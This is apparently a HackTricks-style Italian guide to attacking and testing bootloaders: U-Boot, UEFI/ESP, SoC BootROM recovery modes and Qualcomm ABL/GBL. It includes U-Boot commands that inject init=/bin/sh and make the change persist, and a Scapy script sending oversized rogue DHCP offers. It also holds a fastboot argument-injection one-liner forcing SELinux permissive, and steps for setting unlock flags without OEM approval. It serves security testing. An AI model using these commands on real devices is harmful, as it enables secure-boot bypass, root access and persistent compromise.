# Test del bootloader

{{#include ../../banners/hacktricks-training.md}}

I passaggi seguenti sono raccomandati per modificare le configurazioni di avvio del dispositivo e testare bootloader come U-Boot e loader di classe UEFI. Concentrati sull'ottenere early code execution, valutare le protezioni di signature/rollback e abusare dei percorsi di recovery o network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: quick wins e abuso dell'ambiente

1. Accedere alla shell dell'interprete
- Durante il boot, premi un tasto di interruzione noto (spesso qualsiasi tasto, 0, spazio, o una sequenza "magica" specifica della board) prima che `bootcmd` venga eseguito per scendere al prompt di U-Boot.

2. Ispezionare lo stato di boot e le variabili
- Comandi utili:
- `printenv` (dump dell'ambiente)
- `bdinfo` (info board, indirizzi di memoria)
- `help bootm; help booti; help bootz` (metodi di boot kernel supportati)
- `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modificare gli argomenti di boot per ottenere una root shell
- Aggiungi `init=/bin/sh` in modo che il kernel apra una shell invece di eseguire l'init normale:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot dal tuo server TFTP
- Configura la rete e scarica un kernel/immagine fit dalla LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Rendere persistenti le modifiche tramite l'ambiente
- Se lo storage dell'env non è write-protected, puoi rendere persistente il controllo:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Controlla variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori mal configurati possono permettere ripetuti accessi alla shell durante il break.

6. Controllare feature di debug/insicure
- Cerca: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` senza restrizioni, abilità di `loady`/`loads` via seriale, `env import` da media non trustati, e kernel/ramdisk caricati senza controlli di firma.

7. Test di immagini/verification in U-Boot
- Se la piattaforma dichiara secure/verified boot con immagini FIT, prova immagini sia non firmate che manomesse:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` spesso permette il boot di payload arbitrari.

## Superficie di network-boot (DHCP/PXE) e server rogue

8. Fuzzing dei parametri PXE/DHCP
- La gestione legacy BOOTP/DHCP di U-Boot ha avuto problemi di sicurezza della memoria. Per esempio, CVE‑2024‑42040 descrive memory disclosure tramite risposte DHCP appositamente costruite che possono leak byte dalla memoria di U-Boot sulla rete. Esegui i percorsi di codice DHCP/PXE con valori eccessivamente lunghi/o ai limiti (option 67 bootfile-name, vendor options, campi file/servername) e osserva per blocchi/leaks.
- Snippet minimale Scapy per stressare i parametri di boot durante il netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valida anche se i campi filename PXE vengono passati alla logica di shell/loader senza sanitizzazione quando concatenati a script di provisioning lato OS.

9. Test di command injection con DHCP rogue server
- Allestisci un servizio DHCP/PXE rogue e prova a iniettare caratteri nei campi filename o options per raggiungere interpreter di comandi nelle fasi successive della catena di boot. Metasploit’s DHCP auxiliary, `dnsmasq`, o script Scapy personalizzati funzionano bene. Assicurati di isolare prima la rete di laboratorio.

## Modalità di recovery ROM dello SoC che sovvertono l'avvio normale

Molti SoC espongono una modalità BootROM "loader" che accetterà codice via USB/UART anche quando le immagini flash sono invalide. Se i fuse di secure-boot non sono bruciati, questo può fornire arbitrary code execution molto presto nella catena.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Valuta se il dispositivo ha eFuses/OTP del secure-boot bruciati. Se no, le modalità di download BootROM spesso bypassano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs) eseguendo il tuo primo-stage payload direttamente da SRAM/DRAM.

## UEFI/PC-class bootloader: controlli rapidi

10. Manomissione dell'ESP e test di rollback
- Monta la EFI System Partition (ESP) e controlla i componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi del logo vendor.
- Prova a fare il boot con componenti firmati downgradati o noti vulnerabili se le revoche di Secure Boot (dbx) non sono aggiornate. Se la piattaforma continua a fidarsi di vecchi shims/bootmanagers, spesso puoi caricare il tuo kernel o `grub.cfg` dall'ESP per ottenere persistenza.

11. Bug di parsing dei logo di boot (classe LogoFAIL)
- Diversi firmware OEM/IBV erano vulnerabili a difetti di parsing immagine in DXE che processano i boot logo. Se un attaccante può mettere un'immagine appositamente creata sull'ESP sotto un percorso vendor-specifico (es., `\EFI\<vendor>\logo\*.bmp`) e riavviare, potrebbe essere possibile code execution durante l'early boot anche con Secure Boot abilitato. Verifica se la piattaforma accetta logo forniti dall'utente e se quei percorsi sono scrivibili dall'OS.

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Su dispositivi Android 16 che usano ABL di Qualcomm per caricare la **Generic Bootloader Library (GBL)**, verifica se ABL **autentica** l'app UEFI che carica dalla partizione `efisp`. Se ABL controlla solo la presenza dell'app UEFI e non verifica le firme, una primitive di scrittura su `efisp` diventa pre-OS unsigned code execution al boot.

Controlli pratici e percorsi di abuso:

- **efisp write primitive**: Serve un modo per scrivere una UEFI app custom in `efisp` (root/servizio privilegiato, bug in app OEM, percorso recovery/fastboot). Senza questo, il gap di caricamento GBL non è direttamente raggiungibile.
- **fastboot OEM argument injection** (bug ABL): Alcune build accettano token extra in `fastboot oem set-gpu-preemption` e li appende alla kernel cmdline. Questo può essere usato per forzare SELinux permissive, abilitando scritture su partizioni protette:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Se il dispositivo è patchato, il comando dovrebbe rifiutare argomenti aggiuntivi.
- **Sblocco del bootloader via flag persistenti**: Un payload a livello di boot può impostare flag di unlock persistenti (es., `is_unlocked=1`, `is_unlocked_critical=1`) per emulare `fastboot oem unlock` senza server/approvazione OEM. Questo è un cambiamento di posture durevole dopo il successivo reboot.

Note difensive/di triage:

- Conferma se ABL esegue la signature verification sul payload GBL/UEFI da `efisp`. Se no, tratta `efisp` come una superficie di persistenza ad alto rischio.
- Tieni traccia se gli handler fastboot OEM di ABL sono stati patchati per **validare il numero di argomenti** e rifiutare token aggiuntivi.

## Precauzioni hardware

Sii cauto quando interagisci con SPI/NAND flash durante l'early boot (es., mettendo a massa pin per bypassare letture) e consulta sempre il datasheet della flash. Cortocircuiti fuori tempo possono corrompere il dispositivo o il programmer.

## Note e suggerimenti aggiuntivi

- Prova `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per spostare blob di ambiente tra RAM e storage; alcune piattaforme permettono l'import da media rimovibili senza autenticazione.
- Per persistenza su sistemi Linux-based che bootano via `extlinux.conf`, modificare la riga `APPEND` (per iniettare `init=/bin/sh` o `rd.break`) sulla partizione di boot è spesso sufficiente quando non sono applicati controlli di firma.
- Se lo userland fornisce `fw_printenv/fw_setenv`, verifica che `/etc/fw_env.config` corrisponda al reale storage dell'env. Offset mal configurati ti permettono di leggere/scrivere la regione MTD sbagliata.

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
